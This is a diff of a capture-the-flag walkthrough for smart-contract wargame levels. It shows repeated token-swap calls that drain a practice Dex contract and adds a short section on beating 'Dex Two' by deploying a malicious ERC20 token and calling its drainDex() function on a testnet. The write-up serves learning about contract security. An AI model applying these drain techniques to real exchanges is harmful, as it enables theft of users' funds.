@@ -250,7 +250,6 @@ await contract.swap(addressToken1, addressToken2, await contract.balanceOf(addre
 await contract.swap(addressToken2, addressToken1, await contract.balanceOf(addressToken2, player));
 // --> player has 24 of 'Token 1'
 
-
 // just swap tokens back and forth, again
 await contract.swap(addressToken1, addressToken2, await contract.balanceOf(addressToken1, player));
 await contract.swap(addressToken2, addressToken1, await contract.balanceOf(addressToken2, player));
@@ -263,3 +262,14 @@ await contract.swap(addressToken2, addressToken1, await contract.balanceOf(addre
 // --> player has 110 of 'Token 1' and 20 of 'Token 2', and Dex has 0!!! of 'Token 1' and 90 of 'Token 2'
 // DONE!
 ```
+
+
+## 23. Dex Two
+
+This challenge has the same `approve` function we can exploit as the `Dex` contract of the previous challenge.
+However, we can also beat this level by creating an own malicious `ERC20` token an trade it on `DexTwo`.
+
+Compile [SwappableTokenThree.sol](./solutions/SwappableTokenThree.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
+Do not forget to specify the level `instance` address when deploying the token contract (constructor).  
+Afterwards, just call the `drainDex()` function of our malicious token.
+
